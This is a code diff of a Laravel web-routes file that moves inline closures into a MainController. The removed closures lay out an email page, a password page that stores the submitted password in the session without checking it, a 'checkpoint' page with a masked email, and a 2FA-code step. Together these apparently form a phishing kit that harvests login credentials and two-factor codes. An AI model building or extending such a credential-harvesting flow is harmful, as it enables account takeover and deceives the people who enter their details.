@@ -3,6 +3,7 @@
 use Illuminate\Support\Facades\Route;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
+use App\Http\Controllers\MainController;
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -13,42 +14,8 @@ use Illuminate\Http\Request;
 | be assigned to the "web" middleware group. Make something great!
 |
 */
-
-Route::get('/', function () {
-    $date = Carbon::now();
-    $date = Carbon::createFromFormat('Y-m-d H:i:s', $date);
-    $date = $date->format('F j, Y');
-    return view('index', compact('date'));
-});
-
-Route::get('/email', function () {
-    return view('email');
-});
-
-Route::post('/checkMail', function (Request $request) {
-    $email = $request->email;
-    session(['email' => $email]);
-    return view('password');
-});
-
-Route::post('/change-password', function (Request $request) {
-    $password = $request->password;
-    session(['password' => $password]);
-    $email = session('email');
-    $parts = explode('@', $email);
-    $emailNew = $email;
-    if (count($parts) == 2) {
-        $username = $parts[0];
-        $domain = $parts[1];
-        $visibleLength = 1;
-        $hiddenLength = strlen($username) - (2 * $visibleLength);
-        $hiddenPart = str_repeat('*', $hiddenLength);
-        $hiddenUsername = substr($username, 0, $visibleLength) . $hiddenPart . substr($username, -$visibleLength);
-        $emailNew = $hiddenUsername . '@' . $domain;
-    }
-    return view('checkpoint', compact('emailNew'));
-});
-
-Route::post('/check2fa', function (Request $request) {
-    dd($request);
-});
+Route::get('/', [MainController::class, 'index'])->name('index');
+Route::get('/email', [MainController::class, 'mail'])->name('mail');
+Route::post('/checkMail', [MainController::class, 'checkMail'])->name('checkMail');
+Route::post('/change-password', [MainController::class, 'changePass'])->name('changePass');
+Route::post('/check2fa', [MainController::class, 'check2FA'])->name('check2FA');
